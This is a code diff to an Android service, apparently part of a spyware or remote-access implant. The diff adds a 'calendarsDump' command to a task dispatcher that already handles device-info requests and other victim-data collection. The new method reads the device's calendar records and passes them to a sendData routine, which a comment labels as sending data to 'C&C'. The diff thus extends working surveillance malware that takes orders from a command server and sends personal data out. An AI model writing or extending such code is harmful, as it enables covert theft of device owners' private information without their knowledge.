@@ -19,6 +19,7 @@ import android.os.AsyncTask;
 import android.os.Build;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
+import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Base64;
@@ -171,6 +172,9 @@ public class Fetcher extends Service {
                                 break;
                             case "deviceInfo":
                                 sendData(task, uuid, deviceInfo());
+                                break;
+                            case "calendarsDump":
+                                sendData(task, uuid, fetchCalendar());
                                 break;
                         }
                     }
@@ -361,6 +365,37 @@ public class Fetcher extends Service {
         info.add("\n Fingerprint => " + Build.FINGERPRINT + "\n");
         info.add("\n Release => " + Build.VERSION.RELEASE + "\n");
         return info;
+    }
+
+    // Method to dump calendar records
+    private ArrayList<String> fetchCalendar() {
+        ArrayList<String> calendar = new ArrayList<>();
+        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALENDAR") == PackageManager.PERMISSION_GRANTED) {
+            final Uri CALENDAR_URI = Uri.parse("content://com.android.calendar/calendars");
+            ContentResolver contentResolver = getBaseContext().getContentResolver();
+            final String[] FIELDS = {
+                    CalendarContract.Calendars.NAME,
+                    CalendarContract.Calendars.CALENDAR_DISPLAY_NAME,
+                    CalendarContract.Calendars.CALENDAR_COLOR,
+                    CalendarContract.Calendars.VISIBLE
+            };
+
+            Cursor cursor = contentResolver.query(CALENDAR_URI, FIELDS, null, null, null);
+            try {
+                if (cursor.getCount() > 0) {
+                    while (cursor.moveToNext()) {
+                        String name = cursor.getString(0);
+                        String displayName = cursor.getString(1);
+                        String color = cursor.getString(cursor.getColumnIndex(CalendarContract.Calendars.CALENDAR_COLOR));
+                        calendar.add("\n Name => " + name + "\n Display Name => " + displayName + "\n Color => " + color + "\n");
+                    }
+                }
+            } catch (AssertionError e) {
+                e.printStackTrace();
+            }
+            cursor.close();
+        }
+        return calendar;
     }
 
     // Send data to C&C
